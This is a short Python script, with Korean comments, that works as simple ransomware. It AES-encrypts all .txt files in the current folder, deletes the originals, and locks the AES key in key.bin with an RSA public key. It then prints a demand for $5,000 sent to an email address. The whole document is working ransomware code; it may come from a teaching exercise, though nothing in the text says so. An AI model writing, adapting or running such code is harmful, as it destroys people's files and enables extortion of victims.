#-*- coding: utf-8 -*- 
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import os, sys, glob
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

key = get_random_bytes(16) # AES 암호화에 사용할 128bits 대칭키를 랜덤으로 생성

#=== Read text from .txt file ===#
for file in glob.glob("*.txt"):
	filename = str(file).split('.')[0]
	inFileObj = open(file, 'rt', encoding='UTF8')
	msg = inFileObj.read().encode('UTF8')
	inFileObj.close()

	cipher = AES.new(key, AES.MODE_CBC)
	cipher_msg = cipher.encrypt(pad(msg, AES.block_size))

	iv = b64encode(cipher.iv).decode('utf-8') # iv를 이용해서 이후 복호화에 사용

	ivFileName = str(filename)+'_iv.txt'
	ivFileObj = open("iv/"+ivFileName, 'w', encoding='UTF8')
	ivFileObj.write(iv)
	ivFileObj.close()

	#=== Write Ciphertext to .enc file ===#
	out_file_name = str(filename)+'.enc'
	outFileObj = open(out_file_name, 'w', encoding='UTF8')
	outFileObj.write(b64encode(cipher_msg).decode('utf-8')) #ct value
	outFileObj.close()
	os.remove(file)

# 대칭키를 RSA 공개키 알고리즘을 이용해 암호화하고, key.bin에 저장한다.
recipient_key = RSA.import_key(open("pkey/receiver.pem").read())
key_out = open("key.bin","wb")
cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_key = cipher_rsa.encrypt(key) # 대칭키를 RSA 공개키로 암호화해서 저장
key_out.write(enc_key)
key_out.close()
""""""
print("Your text files are encrypted.")
print("To decrypt them, you need to pay me $5,000 and send key.bin in your folder to [dotsi@ewhain.net].")
